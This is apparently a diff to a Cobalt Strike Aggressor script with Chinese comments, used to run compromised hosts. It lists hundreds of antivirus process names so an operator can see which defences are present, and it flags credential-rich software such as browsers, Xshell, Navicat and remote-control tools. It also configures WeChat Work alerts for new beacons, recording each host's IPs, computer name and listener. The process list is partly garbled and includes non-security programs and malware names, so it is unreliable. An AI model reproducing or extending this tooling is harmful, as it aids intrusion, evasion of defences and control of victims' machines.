@("rescue32.exe", "已知杀软进程,名称暂未收录"), @("rrguard.exe", "已知杀软进程,名称暂未收录"), @("rshell.exe", "已知杀软进程,名称暂未收录"), @("rtvscn95.exe", "已知杀软进程,名称暂未收录"), @("rulaunch.exe", "已知杀软进程,名称暂未收录"), @("run32dll.exe", "已知杀软进程,名称暂未收录"), @("rundll.exe", "已知杀软进程,名称暂未收录"), @("rundll16.exe", "已知杀软进程,名称暂未收录"), @("ruxdll32.exe", "已知杀软进程,名称暂未收录"), @("safeweb.exe", "已知杀软进程,名称暂未收录"), @("sahagent.exescan32.exe", "已知杀软进程,名称暂未收录"), @("save.exe", "已知杀软进程,名称暂未收录"), @("savenow.exe", "已知杀软进程,名称暂未收录"), @("sbserv.exe", "已知杀软进程,名称暂未收录"), @("sc.exe", "已知杀软进程,名称暂未收录"), @("scam32.exe", "已知杀软进程,名称暂未收录"), @("scan95.exe", "已知杀软进程,名称暂未收录"), @("scanpm.exe", "已知杀软进程,名称暂未收录"), @("scrscan.exe", "已知杀软进程,名称暂未收录"), @("serv95.exe", "已知杀软进程,名称暂未收录"), @("setup_flowprotector_us.exe", "已知杀软进程,名称暂未收录"), @("setupvameeval.exe", "已知杀软进程,名称暂未收录"), @("sfc.exe", "已知杀软进程,名称暂未收录"), @("sgssfw32.exe", "已知杀软进程,名称暂未收录"), @("sh.exe", "已知杀软进程,名称暂未收录"), @("shellspyinstall.exe", "已知杀软进程,名称暂未收录"), @("shn.exe", "已知杀软进程,名称暂未收录"), @("showbehind.exe", "已知杀软进程,名称暂未收录"), @("smc.exe", "已知杀软进程,名称暂未收录"), @("sms.exe", "已知杀软进程,名称暂未收录"), @("smss32.exe", "已知杀软进程,名称暂未收录"), @("soap.exe", "已知杀软进程,名称暂未收录"), @("sofi.exe", "已知杀软进程,名称暂未收录"), @("sperm.exe", "已知杀软进程,名称暂未收录"), @("spf.exe", "已知杀软进程,名称暂未收录"), @("spoler.exe", "已知杀软进程,名称暂未收录"), @("spoolcv.exe", "已知杀软进程,名称暂未收录"), @("spoolsv32.exe", "已知杀软进程,名称暂未收录"), @("spyxx.exe", "已知杀软进程,名称暂未收录"), @("srexe.exe", "已知杀软进程,名称暂未收录"), @("srng.exe", "已知杀软进程,名称暂未收录"), @("ss3edit.exe", "已知杀软进程,名称暂未收录"), @("ssg_4104.exe", "已知杀软进程,名称暂未收录"), @("ssgrate.exe", "已知杀软进程,名称暂未收录"), @("st2.exe", "已知杀软进程,名称暂未收录"), @("start.exe", "已知杀软进程,名称暂未收录"), @("stcloader.exe", "已知杀软进程,名称暂未收录"), @("supftrl.exe", "已知杀软进程,名称暂未收录"), @("support.exe", "已知杀软进程,名称暂未收录"), @("supporter5.exe", "已知杀软进程,名称暂未收录"), @("svchostc.exe", "已知杀软进程,名称暂未收录"), @("svchosts.exe", "已知杀软进程,名称暂未收录"), @("sweep95.exe", "已知杀软进程,名称暂未收录"), @("sweepnet.sweepsrv.sys.swnetsup.exe", "已知杀软进程,名称暂未收录"), @("symproxysvc.exe", "已知杀软进程,名称暂未收录"), @("symtray.exe", "已知杀软进程,名称暂未收录"), @("sysedit.exe", "已知杀软进程,名称暂未收录"), @("sysupd.exe", "已知杀软进程,名称暂未收录"), @("taskmg.exe", "已知杀软进程,名称暂未收录"), @("taskmo.exe", "已知杀软进程,名称暂未收录"), @("taumon.exe", "已知杀软进程,名称暂未收录"), @("tbscan.exe", "已知杀软进程,名称暂未收录"), @("tc.exe", "已知杀软进程,名称暂未收录"), @("tca.exe", "已知杀软进程,名称暂未收录"), @("tcm.exe", "已知杀软进程,名称暂未收录"), @("tds-3.exe", "已知杀软进程,名称暂未收录"), @("tds2-98.exe", "已知杀软进程,名称暂未收录"), @("tds2-nt.exe", "已知杀软进程,名称暂未收录"), @("teekids.exe", "已知杀软进程,名称暂未收录"), @("tfak.exe", "已知杀软进程,名称暂未收录"), @("tfak5.exe", "已知杀软进程,名称暂未收录"), @("tgbob.exe", "已知杀软进程,名称暂未收录"), @("titanin.exe", "已知杀软进程,名称暂未收录"), @("titaninxp.exe", "已知杀软进程,名称暂未收录"), @("tracert.exe", "已知杀软进程,名称暂未收录"), @("trickler.exe", "已知杀软进程,名称暂未收录"), @("trjscan.exe", "已知杀软进程,名称暂未收录"), @("trjsetup.exe", "已知杀软进程,名称暂未收录"), @("trojantrap3.exe", "已知杀软进程,名称暂未收录"), @("tsadbot.exe", "已知杀软进程,名称暂未收录"), @("tvmd.exe", "已知杀软进程,名称暂未收录"), @("tvtmd.exe", "已知杀软进程,名称暂未收录"), @("undoboot.exe", "已知杀软进程,名称暂未收录"), @("updat.exe", "已知杀软进程,名称暂未收录"), @("upgrad.exe", "已知杀软进程,名称暂未收录"), @("utpost.exe", "已知杀软进程,名称暂未收录"), @("vbcmserv.exe", "已知杀软进程,名称暂未收录"), @("vbcons.exe", "已知杀软进程,名称暂未收录"), @("vbust.exe", "已知杀软进程,名称暂未收录"), @("vbwin9x.exe", "已知杀软进程,名称暂未收录"), @("vbwinntw.exe", "已知杀软进程,名称暂未收录"), @("vcsetup.exe", "已知杀软进程,名称暂未收录"), @("vet32.exe", "已知杀软进程,名称暂未收录"), @("vet95.exe", "已知杀软进程,名称暂未收录"), @("vettray.exe", "已知杀软进程,名称暂未收录"), @("vfsetup.exe", "已知杀软进程,名称暂未收录"), @("vir-help.exe", "已知杀软进程,名称暂未收录"), @("virusmdpersonalfirewall.exe", "已知杀软进程,名称暂未收录"), @("vnlan300.exe", "已知杀软进程,名称暂未收录"), @("vnpc3000.exe", "已知杀软进程,名称暂未收录"), @("vpc32.exe", "已知杀软进程,名称暂未收录"), @("vpc42.exe", "已知杀软进程,名称暂未收录"), @("vpfw30s.exe", "已知杀软进程,名称暂未收录"), @("vscan40.exe", "已知杀软进程,名称暂未收录"), @("vscenu6.02d30.exe", "已知杀软进程,名称暂未收录"), @("vsched.exe", "已知杀软进程,名称暂未收录"), @("vsecomr.exe", "已知杀软进程,名称暂未收录"), @("vshwin32.exe", "已知杀软进程,名称暂未收录"), @("vsisetup.exe", "已知杀软进程,名称暂未收录"), @("vsmain.exe", "已知杀软进程,名称暂未收录"), @("vsstat.exe", "已知杀软进程,名称暂未收录"), @("vswin9xe.exe", "已知杀软进程,名称暂未收录"), @("vswinntse.exe", "已知杀软进程,名称暂未收录"), @("vswinperse.exe", "已知杀软进程,名称暂未收录"), @("w32dsm89.exe", "已知杀软进程,名称暂未收录"), @("w9x.exe", "已知杀软进程,名称暂未收录"), @("watchdog.exe", "已知杀软进程,名称暂未收录"), @("webdav.exe", "已知杀软进程,名称暂未收录"), @("webtrap.exe", "已知杀软进程,名称暂未收录"), @("wfindv32.exe", "已知杀软进程,名称暂未收录"), @("whoswatchingme.exe", "已知杀软进程,名称暂未收录"), @("wimmun32.exe", "已知杀软进程,名称暂未收录"), @("win-bugsfix.exe", "已知杀软进程,名称暂未收录"), @("win32.exe", "已知杀软进程,名称暂未收录"), @("win32us.exe", "已知杀软进程,名称暂未收录"), @("winactive.exe", "已知杀软进程,名称暂未收录"), @("window.exe", "已知杀软进程,名称暂未收录"), @("windows.exe", "已知杀软进程,名称暂未收录"), @("wininetd.exe", "已知杀软进程,名称暂未收录"), @("wininitx.exe", "已知杀软进程,名称暂未收录"), @("winlogin.exe", "已知杀软进程,名称暂未收录"), @("winmain.exe", "已知杀软进程,名称暂未收录"), @("winnet.exe", "已知杀软进程,名称暂未收录"), @("winppr32.exe", "已知杀软进程,名称暂未收录"), @("winrecon.exe", "已知杀软进程,名称暂未收录"), @("winservn.exe", "已知杀软进程,名称暂未收录"), @("winssk32.exe", "已知杀软进程,名称暂未收录"), @("winstart.exe", "已知杀软进程,名称暂未收录"), @("winstart001.exe", "已知杀软进程,名称暂未收录"), @("wintsk32.exe", "已知杀软进程,名称暂未收录"), @("winupdate.exe", "已知杀软进程,名称暂未收录"), @("wkufind.exe", "已知杀软进程,名称暂未收录"), @("wnad.exe", "已知杀软进程,名称暂未收录"), @("wnt.exe", "已知杀软进程,名称暂未收录"), @("wradmin.exe", "已知杀软进程,名称暂未收录"), @("wrctrl.exe", "已知杀软进程,名称暂未收录"), @("wsbgate.exe", "已知杀软进程,名称暂未收录"), @("wupdater.exe", "已知杀软进程,名称暂未收录"), @("wupdt.exe", "已知杀软进程,名称暂未收录"), @("wyvernworksfirewall.exe", "已知杀软进程,名称暂未收录"), @("xpf202en.exe", "已知杀软进程,名称暂未收录"), @("zapro.exe", "已知杀软进程,名称暂未收录"), @("zapsetup3001.exe", "已知杀软进程,名称暂未收录"), @("zatutor.exe", "已知杀软进程,名称暂未收录"), @("zonalm2601.exe", "已知杀软进程,名称暂未收录"), @("zonealarm.exe", "已知杀软进程,名称暂未收录"), @("AVPM.exe", "已知杀软进程,名称暂未收录"), @("A2CMD.exe", "已知杀软进程,名称暂未收录"), @("A2SERVICE.exe", "已知杀软进程,名称暂未收录"), @("A2FREE.exe", "已知杀软进程,名称暂未收录"), @("ADVCHK.exe", "已知杀软进程,名称暂未收录"), @("AGB.exe", "已知杀软进程,名称暂未收录"), @("AKRNL.exe", "已知杀软进程,名称暂未收录"), @("AHPROCMONSERVER.exe", "已知杀软进程,名称暂未收录"), @("AIRDEFENSE.exe", "已知杀软进程,名称暂未收录"), @("ALERTSVC.exe", "已知杀软进程,名称暂未收录"), @("AVIRA.exe", "已知杀软进程,名称暂未收录"), @("AMON.exe", "已知杀软进程,名称暂未收录"), @("TROJAN.exe", "已知杀软进程,名称暂未收录"), @("AVZ.exe", "已知杀软进程,名称暂未收录"), @("ANTIVIR.exe", "已知杀软进程,名称暂未收录"), @("APVXDWIN.exe", "已知杀软进程,名称暂未收录"), @("ARMOR2NET.exe", "已知杀软进程,名称暂未收录"), @("ASH.exeexe.exe", "已知杀软进程,名称暂未收录"), @("ASHENHCD.exe", "已知杀软进程,名称暂未收录"), @("ASHMAISV.exe", "已知杀软进程,名称暂未收录"), @("ASHPOPWZ.exe", "已知杀软进程,名称暂未收录"), @("ASHSERV.exe", "已知杀软进程,名称暂未收录"), @("ASHSIMPL.exe", "已知杀软进程,名称暂未收录"), @("ASHSKPCK.exe", "已知杀软进程,名称暂未收录"), @("ASHWEBSV.exe", "已知杀软进程,名称暂未收录"), @("ASWUPDSV.exe", "已知杀软进程,名称暂未收录"), @("ASWSCAN.exe", "已知杀软进程,名称暂未收录"), @("AVCIMAN.exe", "已知杀软进程,名称暂未收录"), @("AVCONSOL.exe", "已知杀软进程,名称暂未收录"), @("AVENGINE.exe", "已知杀软进程,名称暂未收录"), @("AVESVC.exe", "已知杀软进程,名称暂未收录"), @("AVEVAL.exe", "已知杀软进程,名称暂未收录"), @("AVEVL32.exe", "已知杀软进程,名称暂未收录"), @("AVGAM.exe", "已知杀软进程,名称暂未收录"), @("AVGCC.exe", "已知杀软进程,名称暂未收录"), @("AVGCHSVX.exe", "已知杀软进程,名称暂未收录"), @("AVGCSRVX.exe", "已知杀软进程,名称暂未收录"), @("AVGNSX.exe", "已知杀软进程,名称暂未收录"), @("AVGCC32.exe", "已知杀软进程,名称暂未收录"), @("AVGCTRL.exe", "已知杀软进程,名称暂未收录"), @("AVGEMC.exe", "已知杀软进程,名称暂未收录"), @("AVGFWSRV.exe", "已知杀软进程,名称暂未收录"), @("AVGNTMGR.exe", "已知杀软进程,名称暂未收录"), @("AVGSERV.exe", "已知杀软进程,名称暂未收录"), @("AVGTRAY.exe", "已知杀软进程,名称暂未收录"), @("AVGUPSVC.exe", "已知杀软进程,名称暂未收录"), @("AVINITNT.exe", "已知杀软进程,名称暂未收录"), @("AVKSERV.exe", "已知杀软进程,名称暂未收录"), @("AVKSERVICE.exe", "已知杀软进程,名称暂未收录"), @("AVKWCTL.exe", "已知杀软进程,名称暂未收录"), @("AVP32.exe", "已知杀软进程,名称暂未收录"), @("AVPCC.exe", "已知杀软进程,名称暂未收录"), @("AVSERVER.exe", "已知杀软进程,名称暂未收录"), @("AVSCHED32.exe", "已知杀软进程,名称暂未收录"), @("AVSYNMGR.exe", "已知杀软进程,名称暂未收录"), @("AVWUPD32.exe", "已知杀软进程,名称暂未收录"), @("AVWUPSRV.exe", "已知杀软进程,名称暂未收录"), @("AVXMONITOR.exe", "已知杀软进程,名称暂未收录"), @("AVXQUAR.exe", "已知杀软进程,名称暂未收录"), @("BDSWITCH.exe", "已知杀软进程,名称暂未收录"), @("BLACKD.exe", "已知杀软进程,名称暂未收录"), @("BLACKICE.exe", "已知杀软进程,名称暂未收录"), @("CAFIX.exe", "已知杀软进程,名称暂未收录"), @("BITDEFENDER.exe", "已知杀软进程,名称暂未收录"), @("CCEVTMGR.exe", "已知杀软进程,名称暂未收录"), @("CFP.exe", "已知杀软进程,名称暂未收录"), @("CFPCONFIG.exe", "已知杀软进程,名称暂未收录"), @("CFIAUDIT.exe", "已知杀软进程,名称暂未收录"), @("CLAMTRAY.exe", "已知杀软进程,名称暂未收录"), @("CLAMWIN.exe", "已知杀软进程,名称暂未收录"), @("CUREIT.exe", "已知杀软进程,名称暂未收录"), @("DEFWATCH.exe", "已知杀软进程,名称暂未收录"), @("DRVIRUS.exe", "已知杀软进程,名称暂未收录"), @("DRWADINS.exe", "已知杀软进程,名称暂未收录"), @("DRWEB.exe", "已知杀软进程,名称暂未收录"), @("DEFENDERDAEMON.exe", "已知杀软进程,名称暂未收录"), @("DWEBLLIO.exe", "已知杀软进程,名称暂未收录"), @("DWEBIO.exe", "已知杀软进程,名称暂未收录"), @("ESCANH95.exe", "已知杀软进程,名称暂未收录"), @("ESCANHNT.exe", "已知杀软进程,名称暂未收录"), @("EWIDOCTRL.exe", "已知杀软进程,名称暂未收录"), @("EZANTIVIRUSREGISTRATIONCHECK.exe", "已知杀软进程,名称暂未收录"), @("F-AGNT95.exe", "已知杀软进程,名称暂未收录"), @("FAMEH32.exe", "已知杀软进程,名称暂未收录"), @("FILEMON.exe", "已知杀软进程,名称暂未收录"), @("FIREWALL.exe", "已知杀软进程,名称暂未收录"), @("FORTICLIENT.exe", "已知杀软进程,名称暂未收录"), @("FORTISCAN.exe", "已知杀软进程,名称暂未收录"), @("FPAVSERVER.exe", "已知杀软进程,名称暂未收录"), @("FPROTTRAY.exe", "已知杀软进程,名称暂未收录"), @("FPWIN.exe", "已知杀软进程,名称暂未收录"), @("FRESHCLAM.exe", "已知杀软进程,名称暂未收录"), @("FSAV32.exe", "已知杀软进程,名称暂未收录"), @("FSBWSYS.exe", "已知杀软进程,名称暂未收录"), @("F-SCHED.exe", "已知杀软进程,名称暂未收录"), @("FSDFWD.exe", "已知杀软进程,名称暂未收录"), @("FSGK32.exe", "已知杀软进程,名称暂未收录"), @("FSGK32ST.exe", "已知杀软进程,名称暂未收录"), @("FSGUIEXE.exe", "已知杀软进程,名称暂未收录"), @("FSMA32.exe", "已知杀软进程,名称暂未收录"), @("FSMB32.exe", "已知杀软进程,名称暂未收录"), @("FSPEX.exe", "已知杀软进程,名称暂未收录"), @("FSSM32.exe", "已知杀软进程,名称暂未收录"), @("F-STOPW.exe", "已知杀软进程,名称暂未收录"), @("GCASDTSERV.exe", "已知杀软进程,名称暂未收录"), @("GCASSERV.exe", "已知杀软进程,名称暂未收录"), @("GIANTANTISPYWARE.exe", "已知杀软进程,名称暂未收录"), @("GUARDGUI.exe", "已知杀软进程,名称暂未收录"), @("GUARDNT.exe", "已知杀软进程,名称暂未收录"), @("GUARDXSERVICE.exe", "已知杀软进程,名称暂未收录"), @("GUARDXKICKOFF.exe", "已知杀软进程,名称暂未收录"), @("HREGMON.exe", "已知杀软进程,名称暂未收录"), @("HRRES.exe", "已知杀软进程,名称暂未收录"), @("HSOCKPE.exe", "已知杀软进程,名称暂未收录"), @("HUPDATE.exe", "已知杀软进程,名称暂未收录"), @("IAMAPP.exe", "已知杀软进程,名称暂未收录"), @("IAMSERV.exe", "已知杀软进程,名称暂未收录"), @("ICLOAD95.exe", "已知杀软进程,名称暂未收录"), @("ICLOADNT.exe", "已知杀软进程,名称暂未收录"), @("ICMON.exe", "已知杀软进程,名称暂未收录"), @("ICSSUPPNT.exe", "已知杀软进程,名称暂未收录"), @("ICSUPP95.exe", "已知杀软进程,名称暂未收录"), @("ICSUPPNT.exe", "已知杀软进程,名称暂未收录"), @("INETUPD.exe", "已知杀软进程,名称暂未收录"), @("INOCIT.exe", "已知杀软进程,名称暂未收录"), @("INORPC.exe", "已知杀软进程,名称暂未收录"), @("INORT.exe", "已知杀软进程,名称暂未收录"), @("INOTASK.exe", "已知杀软进程,名称暂未收录"), @("INOUPTNG.exe", "已知杀软进程,名称暂未收录"), @("IOMON98.exe", "已知杀软进程,名称暂未收录"), @("ISAFE.exe", "已知杀软进程,名称暂未收录"), @("ISATRAY.exe", "已知杀软进程,名称暂未收录"), @("KAV.exe", "已知杀软进程,名称暂未收录"), @("KAVMM.exe", "已知杀软进程,名称暂未收录"), @("KAVPF.exe", "已知杀软进程,名称暂未收录"), @("KAVPFW.exe", "已知杀软进程,名称暂未收录"), @("KAVSTART.exe", "已知杀软进程,名称暂未收录"), @("KAVSVC.exe", "已知杀软进程,名称暂未收录"), @("KAVSVCUI.exe", "已知杀软进程,名称暂未收录"), @("KMAILMON.exe", "已知杀软进程,名称暂未收录"), @("MAMUTU.exe", "已知杀软进程,名称暂未收录"), @("MCAGENT.exe", "已知杀软进程,名称暂未收录"), @("MCMNHDLR.exe", "已知杀软进程,名称暂未收录"), @("MCREGWIZ.exe", "已知杀软进程,名称暂未收录"), @("MCUPDATE.exe", "已知杀软进程,名称暂未收录"), @("MCVSSHLD.exe", "已知杀软进程,名称暂未收录"), @("MINILOG.exe", "已知杀软进程,名称暂未收录"), @("MYAGTSVC.exe", "已知杀软进程,名称暂未收录"), @("MYAGTTRY.exe", "已知杀软进程,名称暂未收录"), @("NAVAPSVC.exe", "已知杀软进程,名称暂未收录"), @("NAVAPW32.exe", "已知杀软进程,名称暂未收录"), @("NAVLU32.exe", "已知杀软进程,名称暂未收录"), @("NAVW32.exe", "已知杀软进程,名称暂未收录"), @("NEOWATCHLOG.exe", "已知杀软进程,名称暂未收录"), @("NEOWATCHTRAY.exe", "已知杀软进程,名称暂未收录"), @("NISSERV.exe", "已知杀软进程,名称暂未收录"), @("NISUM.exe", "已知杀软进程,名称暂未收录"), @("NMAIN.exe", "已知杀软进程,名称暂未收录"), @("NOD32.exe", "已知杀软进程,名称暂未收录"), @("NORMIST.exe", "已知杀软进程,名称暂未收录"), @("NOTSTART.exe", "已知杀软进程,名称暂未收录"), @("NPAVTRAY.exe", "已知杀软进程,名称暂未收录"), @("NPFMSG.exe", "已知杀软进程,名称暂未收录"), @("NPROTECT.exe", "已知杀软进程,名称暂未收录"), @("NSCHED32.exe", "已知杀软进程,名称暂未收录"), @("NSMDTR.exe", "已知杀软进程,名称暂未收录"), @("NSSSERV.exe", "已知杀软进程,名称暂未收录"), @("NSSTRAY.exe", "已知杀软进程,名称暂未收录"), @("NTRTSCAN.exe", "已知杀软进程,名称暂未收录"), @("NTOS.exe", "已知杀软进程,名称暂未收录"), @("NTXCONFIG.exe", "已知杀软进程,名称暂未收录"), @("NUPGRADE.exe", "已知杀软进程,名称暂未收录"), @("NVCOD.exe", "已知杀软进程,名称暂未收录"), @("NVCTE.exe", "已知杀软进程,名称暂未收录"), @("NVCUT.exe", "已知杀软进程,名称暂未收录"), @("NWSERVICE.exe", "已知杀软进程,名称暂未收录"), @("OFCPFWSVC.exe", "已知杀软进程,名称暂未收录"), @("ONLINENT.exe", "已知杀软进程,名称暂未收录"), @("OPSSVC.exe", "已知杀软进程,名称暂未收录"), @("OP_MON.exe", "已知杀软进程,名称暂未收录"), @("PAVFIRES.exe", "已知杀软进程,名称暂未收录"), @("PAVFNSVR.exe", "已知杀软进程,名称暂未收录"), @("PAVKRE.exe", "已知杀软进程,名称暂未收录"), @("PAVPROT.exe", "已知杀软进程,名称暂未收录"), @("PAVPROXY.exe", "已知杀软进程,名称暂未收录"), @("PAVPRSRV.exe", "已知杀软进程,名称暂未收录"), @("PAVSRV51.exe", "已知杀软进程,名称暂未收录"), @("PAVSS.exe", "已知杀软进程,名称暂未收录"), @("PCCGUIDE.exe", "已知杀软进程,名称暂未收录"), @("PCCIOMON.exe", "已知杀软进程,名称暂未收录"), @("PCCNTMON.exe", "已知杀软进程,名称暂未收录"), @("PCCPFW.exe", "已知杀软进程,名称暂未收录"), @("PCCTLCOM.exe", "已知杀软进程,名称暂未收录"), @("PCTAV.exe", "已知杀软进程,名称暂未收录"), @("PERSFW.exe", "已知杀软进程,名称暂未收录"), @("PERTSK.exe", "已知杀软进程,名称暂未收录"), @("PERVAC.exe", "已知杀软进程,名称暂未收录"), @("PESTPATROL.exe", "已知杀软进程,名称暂未收录"), @("PNMSRV.exe", "已知杀软进程,名称暂未收录"), @("PREVSRV.exe", "已知杀软进程,名称暂未收录"), @("PREVX.exe", "已知杀软进程,名称暂未收录"), @("PSIMSVC.exe", "已知杀软进程,名称暂未收录"), @("QHONLINE.exe", "已知杀软进程,名称暂未收录"), @("QHONSVC.exe", "已知杀软进程,名称暂未收录"), @("QHWSCSVC.exe", "已知杀软进程,名称暂未收录"), @("QHSET.exe", "已知杀软进程,名称暂未收录"), @("RTVSCN95.exe", "已知杀软进程,名称暂未收录"), @("SALITY.exe", "已知杀软进程,名称暂未收录"), @("SAPISSVC.exe", "已知杀软进程,名称暂未收录"), @("SCANWSCS.exe", "已知杀软进程,名称暂未收录"), @("SAVADMINSERVICE.exe", "已知杀软进程,名称暂未收录"), @("SAVMAIN.exe", "已知杀软进程,名称暂未收录"), @("SAVSCAN.exe", "已知杀软进程,名称暂未收录"), @("SCANNINGPROCESS.exe", "已知杀软进程,名称暂未收录"), @("SDRA64.exe", "已知杀软进程,名称暂未收录"), @("SDHELP.exe", "已知杀软进程,名称暂未收录"), @("SHSTAT.exe", "已知杀软进程,名称暂未收录"), @("SITECLI.exe", "已知杀软进程,名称暂未收录"), @("SPBBCSVC.exe", "已知杀软进程,名称暂未收录"), @("SPIDERCPL.exe", "已知杀软进程,名称暂未收录"), @("SPIDERML.exe", "已知杀软进程,名称暂未收录"), @("SPIDERUI.exe", "已知杀软进程,名称暂未收录"), @("SPYBOTSD.exe", "已知杀软进程,名称暂未收录"), @("SPYXX.exe", "已知杀软进程,名称暂未收录"), @("SS3EDIT.exe", "已知杀软进程,名称暂未收录"), @("STOPSIGNAV.exe", "已知杀软进程,名称暂未收录"), @("SWAGENT.exe", "已知杀软进程,名称暂未收录"), @("SWDOCTOR.exe", "已知杀软进程,名称暂未收录"), @("SWNETSUP.exe", "已知杀软进程,名称暂未收录"), @("SYMLCSVC.exe", "已知杀软进程,名称暂未收录"), @("SYMPROXYSVC.exe", "已知杀软进程,名称暂未收录"), @("SYMSPORT.exe", "已知杀软进程,名称暂未收录"), @("SYMWSC.exe", "已知杀软进程,名称暂未收录"), @("SYNMGR.exe", "已知杀软进程,名称暂未收录"), @("TAUMON.exe", "已知杀软进程,名称暂未收录"), @("TMLISTEN.exe", "已知杀软进程,名称暂未收录"), @("TMNTSRV.exe", "已知杀软进程,名称暂未收录"), @("TMPROXY.exe", "已知杀软进程,名称暂未收录"), @("TNBUTIL.exe", "已知杀软进程,名称暂未收录"), @("TRJSCAN.exe", "已知杀软进程,名称暂未收录"), @("VBA32ECM.exe", "已知杀软进程,名称暂未收录"), @("VBA32IFS.exe", "已知杀软进程,名称暂未收录"), @("VBA32LDR.exe", "已知杀软进程,名称暂未收录"), @("VBA32PP3.exe", "已知杀软进程,名称暂未收录"), @("VBSNTW.exe", "已知杀软进程,名称暂未收录"), @("VCRMON.exe", "已知杀软进程,名称暂未收录"), @("VRFWSVC.exe", "已知杀软进程,名称暂未收录"), @("VRMONNT.exe", "已知杀软进程,名称暂未收录"), @("VRMONSVC.exe", "已知杀软进程,名称暂未收录"), @("VRRW32.exe", "已知杀软进程,名称暂未收录"), @("VSECOMR.exe", "已知杀软进程,名称暂未收录"), @("VSHWIN32.exe", "已知杀软进程,名称暂未收录"), @("VSSTAT.exe", "已知杀软进程,名称暂未收录"), @("WATCHDOG.exe", "已知杀软进程,名称暂未收录"), @("WINSSNOTIFY.exe", "已知杀软进程,名称暂未收录"), @("WRCTRL.exe", "已知杀软进程,名称暂未收录"), @("XCOMMSVR.exe", "已知杀软进程,名称暂未收录"), @("ZLCLIENT.exe", "已知杀软进程,名称暂未收录"), @("ZONEALARM.exe", "已知杀软进程,名称暂未收录"), @("360rp.exe", "360杀毒"), @("afwServ.exe", "已知杀软进程,名称暂未收录"), @("safeboxTray.exe", "已知杀软进程,名称暂未收录"), @("360safebox.exe", "已知杀软进程,名称暂未收录"), @("QQPCTray.exe", "已知杀软进程,名称暂未收录"), @("KSafeTray.exe", "已知杀软进程,名称暂未收录"), @("KSafeSvc.exe", "已知杀软进程,名称暂未收录"), @("KWatch.exe", "已知杀软进程,名称暂未收录"));
+
+# 其他需要重点关注的
+$software = @( @("Foxmail.exe", "Foxmail邮箱"), @("msedge.exe", "msedge浏览器"), @("chrome.exe", "chrome浏览器"), @("navicat.exe", "navicat"), @("Xshell.exe", "Xshell"), @("SunloginClient.exe", "向日葵远控"), @("TeamViewer.exe", "TV远控"), @("XWin_MobaX.exe", "MobaXterm"), @("360se.exe", "360浏览器"), @("Everything.exe", "Everything"), @("SogouExplorer.exe", "搜狗浏览器"), @("SESecurityCenter.exe", "搜狗浏览器"),);
+
+# 修改配置文件
+sub confile {
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$qywx_conf);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "# 企业ID");
+		println($cfile, "\$corpid = \' $+ $3['cid'] $+ \';");
+		println($cfile, "# 应用ID");
+		println($cfile, "\$agentid = \' $+ $3['aid'] $+ \';");
+		println($cfile, "# Secret");
+		println($cfile, "\$corpsecret = \' $+ $3['sec'] $+ \';");
+		println($cfile, "\r\n\r\n# 发送范围");
+		println($cfile, "\$touser = \' $+ $3['uid'] $+ \';");
+		println($cfile, "\$toparty = \' $+ $3['pid'] $+ \';");
+		println($cfile, "\$totag = \' $+ $3['tag'] $+ \';");
+		println($cfile, "\r\n\r\n# 重复消息检查");
+		println($cfile, "\$check = \"".$3['check']."\";");
+		println($cfile, "\$checktime = \' $+ $3['checktime'] $+ \';");
+		
+		# 关闭文件
+		closef($cfile);
+		
+		# 修改完重新加载一下配置文件
+		include_conf($qywx_conf);
+	}
+}
+
+# 企业微信配置文件对话框
+sub dia_conf {
+	# 局部变量
+	local('$defconf $shili');
+
+	# 在显示对话框前，先重新加载一下配置文件
+	include_conf($qywx_conf);
+	
+	# 默认显示文本
+	$shili = "部门和标签为@all时省略该参数 \t推送多个目标用 | 分割， 如：\r\nzhangsan|lisi|wangwu";
+	$defconf = %(uid => '@all', pid => '@all', tag => '@all', shili => $shili, checktime => 1800);
+	
+	# 加载配置文件
+	add($defconf, cid => $corpid);
+	add($defconf, aid => $agentid);
+	add($defconf, sec => $corpsecret);
+	if ($totag) {add($defconf, tag => $totag);}
+	if ($check) {add($defconf, check => $check)};
+	if ($touser) {add($defconf, uid => $touser);}
+	if ($toparty) {add($defconf, pid => $toparty);}
+	if ($checktime) {add($defconf, checktime => $checktime)};
+	#println($defconf);
+
+	# 创建一个对话框， 对话框的名称
+	$dialog = dialog("修改企业微信推送配置文件", $defconf, &confile);
+	
+	# 对话框描述
+	dialog_description($dialog, "使用前需要注册企业微信、获得用户部门标签ID\r\n前三项是必填的");
+	
+	# 必填项
+	drow_text($dialog, 'cid', "企业ID:");
+	drow_text($dialog, 'aid', "应用ID:");
+	drow_text($dialog, 'sec', "Secret:");
+	
+	# 推送范围
+	drow_text_big($dialog, "shili", "示   例:");
+	drow_text($dialog, "uid", "用户ID:");
+	drow_text($dialog, "pid", "部门ID:");
+	drow_text($dialog, "tag", "标签ID:");
+	
+	# 重复消息检查
+	drow_checkbox($dialog, "check", "", "一定时间内重复消息不推送");
+	drow_text($dialog, "checktime", "时间: ");
+
+	# 按钮
+	dbutton_action($dialog, "修改");
+	dbutton_action($dialog, "取消");
+	
+	# 帮助按钮
+	dbutton_help($dialog, "https://work.weixin.qq.com/api/doc/90000/90135/90665");
+	
+	# 显示对话框
+	dialog_show($dialog);
+}
+
+# 不存在配置文件的话创建默认的配置文件
+if (!-exists script_resource("conf/".$qywx_conf))
+{
+	show_error("没找到配置文件，请填写企业ID、应用ID、Secret这些必选项"); 
+	dia_conf();
+} else {
+ 	# 包含配置文件
+	include_conf($qywx_conf);
+	$cerror = "请设置";
+	if ($corpid eq '') { $cerror = $cerror."企业ID、"; }
+	if ($agentid eq '') { $cerror = $cerror."应用ID、"; }
+	if ($corpsecret eq '') { $cerror = $cerror."Secret"; }
+	if ($cerror ne "请设置") {show_error("$cerror"); dia_conf();}
+}
+
+
+sub beacon_repeat_file {
+	# 判断是否修改
+	if ($2 eq '修改') {
+		# 局部变量
+		local('$handle $file');
+		
+		# 配置文件位置 script_resource 函数显示当前路径并拼接传参
+		$file = script_resource("conf/".$beacon_repeat_conf);
+		mkdir_conf();
+		# 覆盖模式写入配置文件
+		$cfile = openf("> $+ $file");
+		
+		# 写入
+		println($cfile, "\$onbre = \" $+ $3['onbre'] $+ \";");
+		println($cfile, "\$internal = \" $+ $3['internal'] $+ \";");
+		println($cfile, "\$external = \" $+ $3['external'] $+ \";");
+		println($cfile, "\$computer = \" $+ $3['computer'] $+ \";");
+		println($cfile, "\$listener = \" $+ $3['listener'] $+ \";");
